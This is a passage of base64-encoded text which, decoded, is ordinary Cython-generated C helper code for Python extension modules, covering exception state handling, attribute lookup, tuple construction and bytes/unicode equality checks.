uICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuICAgIFB5T2JqZWN0ICp0bXBfdmFsdWU7XG4gICAgYXNzZXJ0KHR5cGUgPT0gTlVMTCB8fCAodmFsdWUgIT0gTlVMTCAmJiB0eXBlID09IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpKSk7XG4gICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgaWYgKHVubGlrZWx5KCgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgdmFsdWUpLT50cmFjZWJhY2sgIT0gdGIpKVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpO1xuICAgIH1cbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSB2YWx1ZTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0eXBlKTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgIHRtcF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IHR5cGU7XG4gICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSB2YWx1ZTtcbiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyckZldGNoSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yikge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICBQeU9iamVjdCogZXhjX3ZhbHVlO1xuICAgIGV4Y192YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247XG4gICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IDA7XG4gICAgKnZhbHVlID0gZXhjX3ZhbHVlO1xuICAgICp0eXBlID0gTlVMTDtcbiAgICAqdGIgPSBOVUxMO1xuICAgIGlmIChleGNfdmFsdWUpIHtcbiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgKnRiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSBleGNfdmFsdWUpLT50cmFjZWJhY2s7XG4gICAgICAgIFB5X1hJTkNSRUYoKnRiKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgKnRiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y192YWx1ZSk7XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiNlbHNlXG4gICAgKnR5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlO1xuICAgICp2YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlO1xuICAgICp0YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gMDtcbiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IDA7XG4gICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gMDtcbiNlbmRpZlxufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSkge1xuICAgIFB5VHlwZU9iamVjdCogdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgaWYgKGxpa2VseSh0cC0+dHBfZ2V0YXR0cm8pKVxuICAgICAgICByZXR1cm4gdHAtPnRwX2dldGF0dHJvKG9iaiwgYXR0cl9uYW1lKTtcbiAgICByZXR1cm4gUHlPYmplY3RfR2V0QXR0cihvYmosIGF0dHJfbmFtZSk7XG59XG4jZW5kaWZcblxuXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbnN0YXRpYyB2b2lkIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJfQ2xlYXJBdHRyaWJ1dGVFcnJvcih2b2lkKSB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBpZiAobGlrZWx5KF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSlcbiAgICAgICAgX19QeXhfUHlFcnJfQ2xlYXIoKTtcbn1cbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICh2b2lkKSBQeU9iamVjdF9HZXRPcHRpb25hbEF0dHIob2JqLCBhdHRyX25hbWUsICZyZXN1bHQpO1xuICAgIHJldHVybiByZXN1bHQ7XG4jZWxzZVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICBQeVR5cGVPYmplY3QqIHRwID0gUHlfVFlQRShvYmopO1xuICAgIGlmIChsaWtlbHkodHAtPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgICAgICByZXR1cm4gX1B5T2JqZWN0X0dlbmVyaWNHZXRBdHRyV2l0aERpY3Qob2JqLCBhdHRyX25hbWUsIE5VTEwsIDEpO1xuICAgIH1cbiNlbmRpZlxuICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBhdHRyX25hbWUpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyX0NsZWFyQXR0cmlidXRlRXJyb3IoKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5hbWUoUHlPYmplY3QgKm5hbWUpIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfYiwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmICFQeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19OYW1lRXJyb3IsXG4gICAgICAgICAgICAibmFtZSBcJyVVXCcgaXMgbm90IGRlZmluZWQiLCBuYW1lKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKlxuX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbilcbntcbiAgICBQeU9iamVjdCAqcmVzO1xuICAgIFB5X3NzaXplX3QgaTtcbiAgICBpZiAobiA8PSAwKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUpO1xuICAgIH1cbiAgICByZXMgPSBQeVR1cGxlX05ldyhuKTtcbiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKHJlcywgaSwgc3JjW2ldKSA8ICgwKSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgUHlfSU5DUkVGKHNyY1tpXSk7XG4gICAgfVxuICAgIHJldHVybiByZXM7XG59XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfY29weV9vYmplY3RfYXJyYXkoUHlPYmplY3QgKmNvbnN0ICpDWVRIT05fUkVTVFJJQ1Qgc3JjLCBQeU9iamVjdCoqIENZVEhPTl9SRVNUUklDVCBkZXN0LCBQeV9zc2l6ZV90IGxlbmd0aCkge1xuICAgIFB5T2JqZWN0ICp2O1xuICAgIFB5X3NzaXplX3QgaTtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHtcbiAgICAgICAgdiA9IGRlc3RbaV0gPSBzcmNbaV07XG4gICAgICAgIFB5X0lOQ1JFRih2KTtcbiAgICB9XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqXG5fX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKVxue1xuICAgIFB5T2JqZWN0ICpyZXM7XG4gICAgaWYgKG4gPD0gMCkge1xuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgICB9XG4gICAgcmVzID0gUHlUdXBsZV9OZXcobik7XG4gICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7XG4gICAgX19QeXhfY29weV9vYmplY3RfYXJyYXkoc3JjLCAoKFB5VHVwbGVPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pO1xuICAgIHJldHVybiByZXM7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqXG5fX1B5eF9QeUxpc3RfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pXG57XG4gICAgUHlPYmplY3QgKnJlcztcbiAgICBpZiAobiA8PSAwKSB7XG4gICAgICAgIHJldHVybiBQeUxpc3RfTmV3KDApO1xuICAgIH1cbiAgICByZXMgPSBQeUxpc3RfTmV3KG4pO1xuICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMO1xuICAgIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KHNyYywgKChQeUxpc3RPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pO1xuICAgIHJldHVybiByZXM7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlCeXRlc19FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIHx8XFxcbiAgICAgICAgIShDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKVxuICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpO1xuI2Vsc2VcbiAgICBpZiAoczEgPT0gczIpIHtcbiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpO1xuICAgIH0gZWxzZSBpZiAoUHlCeXRlc19DaGVja0V4YWN0KHMxKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMikpIHtcbiAgICAgICAgY29uc3QgY2hhciAqcHMxLCAqcHMyO1xuICAgICAgICBQeV9zc2l6ZV90IGxlbmd0aCA9IFB5Qnl0ZXNfR0VUX1NJWkUoczEpO1xuICAgICAgICBpZiAobGVuZ3RoICE9IFB5Qnl0ZXNfR0VUX1NJWkUoczIpKVxuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuICAgICAgICBwczEgPSBQeUJ5dGVzX0FTX1NUUklORyhzMSk7XG4gICAgICAgIHBzMiA9IFB5Qnl0ZXNfQVNfU1RSSU5HKHMyKTtcbiAgICAgICAgaWYgKHBzMVswXSAhPSBwczJbMF0pIHtcbiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkge1xuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaW50IHJlc3VsdDtcbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQjAwMDApXG4gICAgICAgICAgICBQeV9oYXNoX3QgaGFzaDEsIGhhc2gyO1xuICAgICAgICAgICAgaGFzaDEgPSAoKFB5Qnl0ZXNPYmplY3QqKXMxKS0+b2Jfc2hhc2g7XG4gICAgICAgICAgICBoYXNoMiA9ICgoUHlCeXRlc09iamVjdCopczIpLT5vYl9zaGFzaDtcbiAgICAgICAgICAgIGlmIChoYXNoMSAhPSBoYXNoMiAmJiBoYXNoMSAhPSAtMSAmJiBoYXNoMiAhPSAtMSkge1xuICAgICAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICAgICAgICAgIH1cbiNlbmRpZlxuICAgICAgICAgICAgcmVzdWx0ID0gbWVtY21wKHBzMSwgcHMyLCAoc2l6ZV90KWxlbmd0aCk7XG4gICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTtcbiAgICAgICAgfVxuICAgIH0gZWxzZSBpZiAoKHMxID09IFB5X05vbmUpICYgUHlCeXRlc19DaGVja0V4YWN0KHMyKSkge1xuICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4gICAgfSBlbHNlIGlmICgoczIgPT0gUHlfTm9uZSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczEpKSB7XG4gICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBpbnQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCogcHlfcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmUoczEsIHMyLCBlcXVhbHMpO1xuICAgICAgICBpZiAoIXB5X3Jlc3VsdClcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3Jlc3VsdCk7XG4gICAgICAgIFB5X0RFQ1JFRihweV9yZXN1bHQpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTFxuICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpO1xuI2Vsc2VcbiAgICBpbnQgczFfaXNfdW5pY29kZSwgczJfaXNfdW5pY29kZTtcbiAgICBpZiAoczEgPT0gczIpIHtcbiAgICAgICAgZ290byByZXR1cm5fZXE7XG4gICAgfVxuICAgIHMxX2lzX3VuaWNvZGUgPSBQeVVuaWNvZGVfQ2hlY2tFeGFjdChzMSk7XG4gICAgczJfaXNfdW5pY29kZSA9IFB5VW5pY29kZV9DaGVja0V4YWN0KHMyKTtcbiAgICBpZiAoczFfaXNfdW5pY29kZSAmIHMyX2lzX3VuaWNvZGUpIHtcbiAgICAgICAgUHlfc3NpemVfdCBsZW5ndGgsIGxlbmd0aDI7XG4gICAgICAgIGludCBraW5kO1xuICAgICAgICB2b2lkICpkYXRhMSwgKmRhdGEyO1xuICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShzMSkgPCAwKSB8fCB1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkoczIpIDwgMCkpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBsZW5ndGggPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChzMSk7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8IDApKSByZXR1cm4gLTE7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBsZW5ndGgyID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoczIpO1xuICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGlmICh1bmxpa2VseShsZW5ndGgyIDwgMCkpIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChsZW5ndGggIT0gbGVuZ3RoMikge1xuICAgICAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgICAgIH1cbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5X2hhc2hfdCBoYXNoMSwgaGFzaDI7XG4gICAgICAgICAgICBoYXNoMSA9ICgoUHlBU0NJSU9iamVjdCopczEpLT5oYXNoO1xuICAgICAgICAgICAgaGFzaDIgPSAoKFB5QVNDSUlPYmplY3QqKXMyKS0+aGFzaDtcbiAgICAgICAgICAgIGlmIChoYXNoMSAhPSBoYXNoMiAmJiBoYXNoMSAhPSAtMSAmJiBoYXNoMiAhPSAtMSkge1xuICAgICAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAga2luZCA9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHMxKTtcbiAgICAgICAgaWYgKGtpbmQgIT0gX19QeXhfUHlVbmljb2RlX0tJTkQoczIpKSB7XG4gICAgICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICAgICAgfVxuICAgICAgICBkYXRhMSA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHMxKTtcbiAgICAgICAgZGF0YTIgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMik7XG4gICAgICAgIGlmIChfX1B5eF9QeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhMSwgMCkgIT0gX19QeXhfUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YTIsIDApKSB7XG4gICAgICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkge1xuICAgICAgICAgICAgZ290byByZXR1cm5fZXE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gbWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkobGVuZ3RoICoga2luZCkpO1xuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpID8gKHJlc3VsdCA9PSAwKSA6IChyZXN1bHQgIT0gMCk7XG4gICAgICAgIH1cbiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIHMyX2lzX3VuaWNvZGUpIHtcbiAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgfSBlbHNlIGlmICgoczIgPT0gUHlfTm9uZSkgJiBzMV9pc191bmljb2RlKSB7XG4gICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGludCByZXN1bHQ7XG4gICAgICAgIFB5T2JqZWN0KiBweV9yZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShzMSwgczIsIGVxdWFscyk7XG4gICAgICAgIGlmICghcHlfcmVzdWx0KVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfcmVzdWx0KTtcbiAgICAgICAgUHlfREVDUkVGKHB5X3Jlc3VsdCk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxucmV0dXJuX2VxOlxuICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTtcbnJldHVybl9uZTpcbiAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4jZW5kaWZcbn1cblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpXG57XG4gICAgUHlfc3NpemVfdCBpLCBuID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKTtcbiAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgaWYgKHVubGlrZWx5KG4gPT0gLTEpKSByZXR1cm4gTlVMTDtcbiAgICAjZW5kaWZcbiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKVxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIGlmICh1bmxpa2VseSghbmFtZWkpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChzID09IG5hbWVpKSByZXR1cm4ga3d2YWx1ZXNbaV07XG4gICAgfVxuICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqbmFtZWkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpO1xuICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgaWYgKHVubGlrZWx5KCFuYW1laSkpIHJldHVybiBOVUxMO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaW50IGVxID0gX19QeXhfUHlVbmljb2RlX0VxdWFscyhzLCBuYW1laSwgUHlfRVEpO1xuICAgICAgICBpZiAodW5saWtlbHkoZXEgIT0gMCkpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShlcSA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgICAgIHJldHVybiBrd3ZhbHVlc1tpXTtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gTlVMTDtcbn1cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKSB7XG4gICAgUHlfc3NpemVfdCBpLCBua3dhcmdzO1xuICAgIFB5T2JqZWN0ICpkaWN0O1xuI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIG5rd2FyZ3MgPSBQeVR1cGxlX1NpemUoa3duYW1lcyk7XG4gICAgaWYgKHVubGlrZWx5KG5rd2FyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIG5rd2FyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKGt3bmFtZXMpO1xuI2VuZGlmXG4gICAgZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICBpZiAodW5saWtlbHkoIWRpY3QpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBmb3IgKGk9MDsgaTxua3dhcmdzOyBpKyspIHtcbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBQeU9iamVjdCAqa2V5ID0gUHlUdXBsZV9HZXRJdGVtKGt3bmFtZXMsIGkpO1xuICAgICAgICBpZiAoIWtleSkgZ290byBiYWQ7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqa2V5ID0gUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0oZGljdCwga2V5LCBrd3ZhbHVlc1tpXSkgPCAwKSlcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICByZXR1cm4gZGljdDtcbmJhZDpcbiAgICBQeV9ERUNSRUYoZGljdCk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG4jZW5kaWZcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHtcbiAgICBQeU9iamVjdCAqZGljdCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdDtcbiAgICByZXR1cm4gbGlrZWx5KGRpY3QpID8gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihkaWN0KSA6IDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKSB7XG4gICAgUHlPYmplY3QgKipkaWN0cHRyID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdG9mZnNldDtcbiAgICBpZiAob2Zmc2V0KSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIGRpY3RwdHIgPSAobGlrZWx5KG9mZnNldCA+IDApKSA/IChQeU9iamVjdCAqKikgKChjaGFyICopb2JqICsgb2Zmc2V0KSA6IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7XG4jZWxzZVxuICAgICAgICBkaWN0cHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTtcbiNlbmRpZlxuICAgIH1cbiAgICByZXR1cm4gKGRpY3RwdHIgJiYgKmRpY3RwdHIpID8gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTigqZGljdHB0cikgOiAwO1xufVxuc3